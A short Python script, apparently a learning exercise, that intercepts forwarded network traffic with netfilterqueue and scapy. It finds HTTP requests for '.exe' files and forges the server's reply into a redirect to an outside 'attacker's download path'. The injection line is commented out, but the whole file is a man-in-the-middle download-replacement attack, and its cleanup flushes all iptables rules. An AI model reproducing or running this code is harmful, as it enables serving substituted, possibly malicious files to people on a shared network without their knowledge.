#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http

#run
#create iptables rule for FORWARD chain
#create queue
#intercept
#detect tcp response
#redirect HTTP response to include attacker's download path

current_req_packet = []


def run():
    set_iptables()
    create_queue()

def create_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, filter_packets)
    try:
        queue.run()
    except KeyboardInterrupt:
        print("[+] CTRL + C detected, resetting iptables")
        reset_iptables()
        sys.exit(0)


def set_iptables():
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


def reset_iptables():
    subprocess.call(["iptables", "--flush"])


def filter_packets(packet):
    global current_req_packet
    scapy_packet = scapy.IP(packet.get_payload())
    if (scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP)):
        if ("GET" in scapy_packet[scapy.Raw].load and ".exe" in scapy_packet[scapy.Raw].load):
            current_req_packet.append(scapy_packet)
            print("Request packet")
            print(scapy_packet[scapy.Raw].show())
        else:
            for req_packet in current_req_packet:
                if scapy_packet[scapy.TCP].seq == req_packet[scapy.TCP].ack:
                    forged_packet = forge_download_packet(scapy_packet)
                   # packet.set_payload(str(forged_packet))
                    print("reply packet")
                    print(scapy_packet[http.HTTPResponse].show())
    packet.accept()
    # filter out request/ response pairs

def forge_download_packet(packet):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.tachibanalaboratories.net/soykaf/Mathematics/MATH1061%20revision.zip\n\n"
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    return packet



run()





















